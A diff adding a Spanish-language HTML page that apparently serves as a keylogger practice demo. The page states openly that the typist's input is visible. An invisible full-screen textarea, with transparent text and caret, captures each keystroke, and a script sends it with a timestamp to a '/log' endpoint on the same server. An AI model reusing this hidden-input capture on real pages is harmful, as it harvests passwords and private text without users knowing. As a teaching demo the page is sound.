@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Práctica Keylogger</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Poppins', sans-serif; 
+            background-color: #121212; 
+            color: #ffffff;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden; 
+        }
+        
+        .mensaje-central {
+            text-align: center;
+            padding: 20px;
+            z-index: 1; 
+            pointer-events: none; /* Permite que el toque pase a la caja invisible */
+        }
+
+        h2 { 
+            font-weight: 400; 
+            margin-bottom: 10px; 
+            font-size: 22px;
+        }
+
+        p.instruccion { 
+            font-size: 16px; 
+            color: #909090; /* Letras verdes para resaltar la acción */
+            margin-top: 20px;
+            animation: parpadeo 1.5s infinite;
+        }
+
+        @keyframes parpadeo {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+        
+        .repo-link {
+            position: absolute;
+            bottom: 30px;
+            font-size: 13px;
+            color: #888;
+            text-decoration: none;
+            z-index: 20; 
+        }
+
+        .repo-link:hover {
+            color: #fff;
+        }
+
+        /* La caja que cubre toda la pantalla para capturar teclas sin verse */
+        #cajaOculta {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent; 
+            color: transparent; /* Hace invisible el texto */
+            caret-color: transparent; /* Oculta el cursor de escritura */
+            border: none;
+            outline: none;
+            resize: none;
+            z-index: 10; 
+            font-size: 16px; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mensaje-central">
+        <h2>No te apures...</h2>
+        <p>Todo lo que estás escribiendo lo puedo ver, pero es para la práctica de Key.</p>
+        <p class="instruccion">Presiona la pantalla y escribe</p>
+    </div>
+
+    <textarea id="cajaOculta" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea>
+    <a href="https://github.com/juanitoelorigi/keylogger-poC" target="_blank" class="repo-link">Visita el Repo en GitHub</a>
+
+    <script>
+        const cajaOculta = document.getElementById('cajaOculta');
+
+        // Captura y envío por Fetch a tu localhost
+        cajaOculta.addEventListener('input', (event) => {
+            const tecla = event.data || '[Borrar]'; 
+            
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    tecla: tecla,
+                    timestamp: new Date().toLocaleTimeString()
+                })
+            }).catch(err => console.error('Error:', err));
+        });
+    </script>
+</body>
+</html>
